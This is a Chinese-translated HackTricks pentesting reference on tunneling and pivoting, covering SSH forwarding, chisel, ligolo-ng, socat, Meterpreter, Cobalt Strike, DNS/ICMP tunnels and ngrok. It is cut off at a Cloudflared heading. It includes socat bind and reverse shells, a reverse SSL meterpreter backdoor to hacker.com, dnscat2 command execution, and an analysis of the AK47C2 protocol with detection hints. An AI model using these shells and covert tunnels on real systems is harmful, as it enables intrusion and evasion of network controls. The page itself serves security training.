# Tunneling and Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Nmap 提示

> [!WARNING]
> Nmap 的 proxy 支持仅限于 TCP 连接，不会影响 ping、端口或 OS 检测扫描。当 scanner 位于 SOCKS proxy 后方时，**禁用主机发现**（`-Pn`）并使用 **TCP connect scan**（`-sT`）。<sup>[[5]](#references)</sup>

## **Bash**

**主机 -> 跳板 -> 内部主机A -> 内部主机B**

最终命令使用 Evil-WinRM 的 `-u` 和 `-i` 选项来指定账户和 WinRM 主机；其默认 WinRM 端口为 5985。<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

OpenSSH 可以通过其加密通道转发 X11 连接、任意 TCP 端口和 Unix-domain sockets。<sup>[[6]](#references)</sup>

SSH 图形连接 (X)

`-Y` 启用受信任的 X11 转发，`-C` 请求对转发数据进行压缩。<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

在 SSH Server 中打开新 Port --> 其他 Port

Remote（`-R`）forwarding 会在 SSH server 上监听并连接到本地端；显式绑定地址控制哪些接口可以访问该监听器。<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

本地端口 --> Compromised host (SSH) --> Third_box:Port

本地（`-L`）forwarding 在 client 上监听，并从 SSH server 端连接到 destination。<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

本地端口 --> Compromised host (SSH) --> 任意位置

Dynamic (`-D`) forwarding creates a local SOCKS4/SOCKS5 listener whose connections are opened from the remote side.<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### 使用 ProxyJump 的多跳

`-J`/`ProxyJump` 会通过一个或多个以逗号分隔的 jump hosts 连接到 target。Forwarding options 仍属于最终的 SSH connection，因此下面的 SOCKS listener 会从 `internal-target` 而不是第一个 bastion 打开 destinations。这样无需登录 jump host 并在那里启动第二个 SSH client。<sup>[[6]](#references)</sup>
```bash
# Reach the final SSH server through two bastions
ssh -J user1@jump1:22,user2@jump2:22 user3@internal-target

# Create a local SOCKS proxy whose connections exit from internal-target
ssh -J user1@jump1,user2@jump2 -N -D 127.0.0.1:1080 user3@internal-target
```
针对 jump machines 的主机特定选项应放置在 `~/.ssh/config` 中；面向目标主机的命令行配置不会自动应用于中间主机。<sup>[[6]](#references)</sup>

### Reverse Port Forwarding

这对于通过 DMZ 从内部主机向你的主机获取 reverse shells 很有用：

服务器的 `GatewayPorts` 设置控制 remote forward 是否可以绑定到 loopback 之外；其默认值为 `no`。<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

此基于 root 的示例会在两台主机上创建 tunnel 设备。服务器必须允许 tun forwarding，且所选账户必须能够访问 tun 设备；在此使用 `root` 账户时，`PermitRootLogin yes` 是一种方式。<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
在服务器端启用转发
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
在客户端设置一条新路由
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **安全 – Terrapin Attack (CVE-2023-48795)**
> OpenSSH 9.6 添加了 strict-KEX 扩展，以抵御 Terrapin 的 early-transport integrity attack。在可能的情况下更新两端；对于较旧的实现，请遵循供应商指南，不要仅因版本号而假设 forwarded channel 受到保护。<sup>[[8]](#references)</sup>

## SSHUTTLE

你可以通过 **ssh** 将所有前往某个 **subnetwork** 的 **traffic** **tunnel** 经过一台主机。\
例如，转发所有前往 10.10.10.0/24 的 traffic。

`sshuttle` 通过 SSH 提供透明代理，并支持选择子网和自定义 SSH 命令，如下所示。<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
使用私钥连接
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

Metasploit 的 `portfwd` 支持本地和远程转发，而其 SOCKS proxy module 用于配合 session routes 或 `autoroute` 工作；在这些示例中，它默认监听 1080 端口。<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

本地端口 --> Compromised host（活动 session）--> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
另一种方法：
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Cobalt Strike 的 Beacon 可以通过 Beacon 中继 SOCKS4a/SOCKS5 连接；`rportfwd` 在被入侵主机上绑定，而 `rportfwd_local` 从 Cobalt Strike 客户端发起目标连接。<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

在 Team Server 上为应通过 Beacon 路由流量的接口开放一个端口。<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> 在这种情况下，**port 是在 Beacon host 中打开的**，而不是在 Team Server 中打开；traffic 会被发送到 Team Server，再从那里发送到指定的 host:port。<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
反向转发手册说明了以下行为：<sup>[[14]](#references)</sup>

- Beacon 的 reverse port forward 旨在**将流量 tunnel 到 Team Server，而不是用于在单台机器之间进行 relay**。
- 流量会**tunnel 在 Beacon 的 C2 流量中**，包括 P2P 链接。
- 高端口通常可以避免特权端口限制，但目标 OS 策略和现有 listeners 仍然适用。

### rPort2Port local

> [!WARNING]
> 在此情况下，**端口是在 Beacon 主机上打开的**，而不是在 Team Server 上，并且**流量会发送到 Cobalt Strike client**（而不是 Team Server），然后再从那里发送到指定的 host:port。<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

该项目提供 `tunnel.aspx`、`tunnel.ashx`、`tunnel.jsp` 和 `tunnel.php` 等 web tunnel endpoints；启动本地 proxy 前，先上传一个受支持的 endpoint。<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

你可以从 [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel) 的 releases 页面下载它\
Chisel 使用 SSH 保护的连接，通过 HTTP 传输 TCP/UDP 流量；请使用兼容的 client/server 构建版本，并确认所选 release 的命令语法。<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### 端口转发
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## wstunnel

[`wstunnel`](https://github.com/erebe/wstunnel) 通过 WebSocket、HTTP/2 或 WebTransport（基于 QUIC 的 HTTP/3）承载静态或动态转发。当前版本支持 TCP、UDP、Unix sockets、stdio、SOCKS5、HTTP proxy，以及 Linux 透明代理 listener，并同时支持正向和反向模式。<sup>[[52]](#references)</sup>

### 反向 SOCKS5 pivot

在攻击者的服务器上运行 server，并使用 `-R` 让 pivot 建立出站连接。在这种方向下，SOCKS5 listener 创建于 **server** 上，而请求的连接则起源于 **client/pivot** 所在的网络。<sup>[[52]](#references)</sup>
```bash
# Attacker: use a certificate valid for pivot.example
wstunnel server --tls-certificate cert.pem --tls-private-key key.pem wss://0.0.0.0:443

# Pivot: expose an attacker-side, loopback-only SOCKS5 listener
wstunnel client --tls-verify-certificate \
-R 'socks5://127.0.0.1:1080' wss://pivot.example:443

# Attacker
proxychains nmap -n -Pn -sT -p 445,3389 10.10.10.0/24
```
reverse static forward 使用相同的方向。例如，以下命令将 pivot 可访问的 `10.10.10.20:445` 暴露在攻击者 loopback 的 `8445` 端口上：<sup>[[52]](#references)</sup>
```bash
wstunnel client --tls-verify-certificate \
-R 'tcp://127.0.0.1:8445:10.10.10.20:445' wss://pivot.example:443
```
### 出站与传输详情

- 在客户端添加 `-p http://user:pass@proxy:8080` 以通过显式 HTTP 代理。在 `curl` 等客户端中使用 `socks5h://127.0.0.1:1080`（或在应用中启用代理 DNS），使内部名称通过 tunnel 在远端解析，而不是泄露给本地解析器。<sup>[[52]](#references)</sup>
- `wss://` 选择受 TLS 保护的 WebSocket。`https://` 客户端选择 HTTP/2，但反向代理/CDN 的缓冲或 HTTP/1 转换通常会破坏双向流；测试此模式时，应直接暴露 wstunnel server。<sup>[[52]](#references)</sup>
- `wts://` 选择基于 QUIC 的 WebTransport。使用 `--enable-webtransport`（或 `wts://` listen URL）启动 server，并允许监听端口上的 UDP。此模式无法穿过传统的 HTTP `CONNECT` proxy，因为该 proxy 传输的是 TCP。<sup>[[52]](#references)</sup>

> [!WARNING]
> 上游项目警告，不要将其内置的自签名证书视为隐私保护措施。优先使用有效的自定义证书，并配合 `--tls-verify-certificate`（或 mTLS）；除非确实需要远程访问，否则将 proxy listeners 保持在 loopback 上；当机密性很重要时，应 tunnel 已经安全的协议。<sup>[[52]](#references)</sup>

## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Ligolo-ng quickstart 介绍了 proxy 上的 TUN interface、用于验证 agent 的证书指纹，以及为 tunneled network 设置路由。<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Agent 绑定与监听

Ligolo-ng 可以在 agent 上添加 listeners，将流量转发到 proxy 端地址，并且可以路由其保留的 `240.0.0.0/4` 地址范围，以访问 agent 本地服务。<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### 访问 Agent 的本地端口
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Rpivot 从受害者端启动 reverse tunnel，并在攻击者的 loopback 地址上暴露 SOCKS4 proxy；其 README 还记录了 NTLM-proxy 凭据和 hash 选项。<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
通过 **NTLM proxy** 进行 Pivot
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Socat 组合了 `TCP-LISTEN`、`EXEC`、`SOCKS4A`、`OPENSSL` 和 `PROXY` 等地址类型；下面的示例组合使用了这些文档化端点。<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### 通过 socks 的 Port2Port
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### 通过 SSL Socat 使用 Meterpreter
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
你可以使用 socat 文档中介绍的 `PROXY` 地址类型，通过**无需身份验证的代理**进行 traversing，方法是在受害者的控制台中执行以下命令，以替代上一条命令。<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

在两端创建证书：Client 和 Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

将本地 SSH 端口（22）连接到 attacker 主机的 443 端口
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Plink 是 PuTTY 的命令行连接工具，具有类似于 `ssh` 的 SSH forwarding 选项。<sup>[[22]](#references)</sup>

SSH 端口请使用大写的 `-P`。`-pw` 为保持兼容性而保留，但会将密码暴露在进程列表中；在可能的情况下，优先使用 key authentication 或 `-pwfile`。<sup>[[22]](#references)[[23]](#references)</sup>

由于该 binary 将在 victim 上执行，且它是 SSH client，因此需要开放 SSH service 和 port，以便建立 reverse connection；以下命令使用 `-R` 将本地可访问的 port forwarding 到攻击者的 machine。<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

创建或修改持久化的 `portproxy` 规则时，请使用具有主机所需权限的上下文。Microsoft 记录了下方使用的 `v4tov4` 添加、显示和删除语法。<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

你需要拥有对该系统的 **RDP access**。\
下载：

SocksOverRDP 使用 Remote Desktop Dynamic Virtual Channels，通过现有的 RDP session 传输 SOCKS5 connection；client plugin 监听 `127.0.0.1:1080`，而 server component 运行在 RDP target 上。<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - 此工具使用 Windows Remote Desktop Service 功能中的 `Dynamic Virtual Channels`（`DVC`）。DVC 负责**通过 RDP connection 隧道传输 packets**。
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

在你的 client computer 中按如下方式加载 **`SocksOverRDP-Plugin.dll`**：
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
现在，我们可以使用 **`mstsc.exe`** 通过 **RDP** **连接**到**受害机**，并应收到一条**提示**，说明 **SocksOverRDP plugin 已启用**，且会在 **127.0.0.1:1080** 上**监听**。

通过 **RDP** **连接**，并将 `SocksOverRDP-Server.exe` 二进制文件上传到受害机并执行：
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
现在，在你的机器（攻击者）上确认 1080 端口正在监听：
```
netstat -antb | findstr 1080
```
现在，您可以使用 [**Proxifier**](https://www.proxifier.com/) 通过该端口代理流量。<sup>[[26]](#references)</sup>

## Proxify Windows GUI Apps

您可以使用 [**Proxifier**](https://www.proxifier.com/) 让 Windows GUI 应用通过代理进行通信。<sup>[[26]](#references)</sup>\
在 **Profile -> Proxy Servers** 中添加 SOCKS 服务器的 IP 和端口。\
在 **Profile -> Proxification Rules** 中添加要进行 proxify 的程序名称，以及要进行 proxify 的目标 IP 的连接；Proxifier 规则可以匹配应用程序、目标主机和端口。<sup>[[27]](#references)</sup>

## 通过 NTLM proxy 建立隧道

前面提到的工具 **Rpivot** 可以通过 NTLM-authenticating proxy 进行中继。配置 auth 文件并使用 NTLMv2 方法时，**OpenVPN** 也可以通过该代理进行路由；这属于 proxy traversal，而不是绕过 proxy authentication。<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Cntlm 可向上游 NTLM proxies 进行身份验证，公开本地 listeners，并可将本地 tunnel port 映射到目标服务；随后，clients 可使用该本地端口。<sup>[[29]](#references)</sup>\
例如，转发端口 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
现在，例如，如果你将受害者上的 **SSH** 服务设置为监听端口 443，就可以通过攻击者的 2222 端口连接到它。<sup>[[29]](#references)</sup>\
你也可以使用一个连接到 localhost:443 的 **meterpreter**，同时让攻击者监听 2222 端口。<sup>[[29]](#references)</sup>

## YARP

YARP（Yet Another Reverse Proxy）是 Microsoft 的 .NET reverse-proxy toolkit。你可以在此处找到它：[https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)。<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Iodine 通过 DNS queries 创建 IPv4 tunnel，并使用 TUN interfaces；文档记录的设置要求两端都具备创建这些 interfaces 所需的 privileges。<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
DNS transport 的开销高于直接 TCP，通常速度较慢；你可以使用以下方式通过此隧道创建压缩 SSH 连接：<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**从这里下载**](https://github.com/iagox86/dnscat2)**。**

Dnscat2 通过 DNS 建立加密的 command-and-control channel；下面的 server 和 client 命令遵循其文档中的用法。<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **在 PowerShell 中**

你可以使用 [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) 在 PowerShell 中运行 dnscat2 client；其 README 记录了如下所示的 `Start-Dnscat2` 参数。<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **使用 dnscat 进行 Port forwarding**

Dnscat2 的交互式 `listen` 命令会将本地 listener 映射到远程主机和端口。<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### 更改 proxychains DNS

Proxychains-ng 会动态 hook TCP 连接，无法承载 UDP 或 ICMP；DNS 代理功能可配置，因此应检查已安装的 `proxychains.conf` 和 resolver helper，而不是假定使用固定的公共 resolver。旧版 `proxyresolv` 脚本提供 `PROXY_DNS_SERVER` 用于选择 resolver；需要解析内部名称时，应使用从 pivot 可访问的 resolver。<sup>[[34]](#references)[[35]](#references)</sup>

## Go 中的 Tunnels

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Storm-2603 actor 创建了一个**双通道 C2（"AK47C2"）**，仅滥用出站的 **DNS** 和**明文 HTTP POST** 流量——这两种协议在企业网络中很少被阻断。<sup>[[2]](#references)</sup>

1. **DNS 模式（AK47DNS）**
• 生成一个随机的 5 字符 SessionID（例如 `H4T14`）。
• 在 *task requests* 前添加 `1`，或在 *results* 前添加 `2`，然后连接不同字段（flags、SessionID、computer name）。
• 每个字段都使用 ASCII 密钥 `VHBD@H` 进行 **XOR 加密**，再进行十六进制编码，并用点号连接——最后加上 attacker-controlled domain：

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• 请求使用 `DnsQuery()` 查询 **TXT**（以及备用的 **MG**）记录。
• 当响应超过 0xFF 字节时，backdoor 会将数据**分片**为每片 63 字节，并插入以下标记：
`s<SessionID>t<TOTAL>p<POS>`，以便 C2 server 对其重新排序。

2. **HTTP 模式（AK47HTTP）**
• 构建一个 JSON envelope：
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• 整个 blob 经 XOR-`VHBD@H` → 十六进制编码后，作为带有 `Content-Type: text/plain` header 的 **`POST /`** 请求 body 发送。
• reply 遵循相同的编码方式，并使用 `cmd.exe /c <command> 2>&1` 执行 `cmd` 字段。

Blue Team 注意事项
• 查找异常的 **TXT queries**：其第一个 label 较长、由十六进制字符组成，并且始终以某个罕见 domain 结尾。
• 使用 YARA 可以轻松检测固定 XOR key 后跟 ASCII-hex 的模式：`6?56484244?484`（`VHBD@H` 的十六进制表示）。
• 对于 HTTP，标记 body 为纯十六进制且字节数为偶数的 text/plain POST 请求。

{{#note}}
该 channel 会将每个 sub-domain label 保持在 63-octet 的 DNS 限制以内，但符合协议本身并不意味着它具有隐蔽性；罕见的 domains、较长的十六进制 labels 以及 query volume 仍然是检测信号。<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Hans 记录了一种使用 TUN device 和 ICMP echo requests 的 IPv4-over-ICMP tunnel；该配置需要具备足够权限才能创建 interface。<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**从这里下载**](https://github.com/utoni/ptunnel-ng.git)。

ptunnel-ng 通过 ICMP 传输 TCP 连接，并使用以下所示的 `-p`、`-l`、`-r` 和 `-R` 选项分别指定 proxy、本地 listener、目标主机和目标端口。<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) 是一个通过安全隧道将本地网络服务发布到 online 的 agent；其 CLI 文档介绍了 HTTP、TCP 和 file URL endpoints，且输出的 endpoint hostname 可能因 endpoint 和 account 而异。<sup>[[39]](#references)</sup>

### 安装

- 创建 account：https://ngrok.com/signup
- 客户端下载：
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### 基本用法

**文档：** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_需要时，agent 还支持身份验证和 TLS 选项。<sup>[[39]](#references)</sup>_

#### TCP 隧道
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### 通过 HTTP 暴露文件
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing HTTP calls

_适用于 XSS、SSRF、SSTI ..._\
独立 agent 默认通过 `http://127.0.0.1:4040` 提供 HTTP inspection interface；该 interface 用于 HTTP 流量。<sup>[[40]](#references)</sup>

#### Tunneling internal HTTP service

`--host-header=rewrite` 选项会重写上游 HTTP `Host` header，使其匹配本地服务。<sup>[[41]](#references)</sup>
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### ngrok.yaml 简单配置示例

此配置使用 ngrok Agent Config v2；named tunnels 使用 `proto` 和 `addr`，并通过 `ngrok start` 启动。<sup>[[42]](#references)</sup>它会打开 3 个 tunnels：

- 2 个 TCP
- 1 个 HTTP，从 /tmp/httpbin/ 暴露静态文件
```yaml
version: 2
tunnels:
mytcp:
addr: 4444
proto: tcp
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

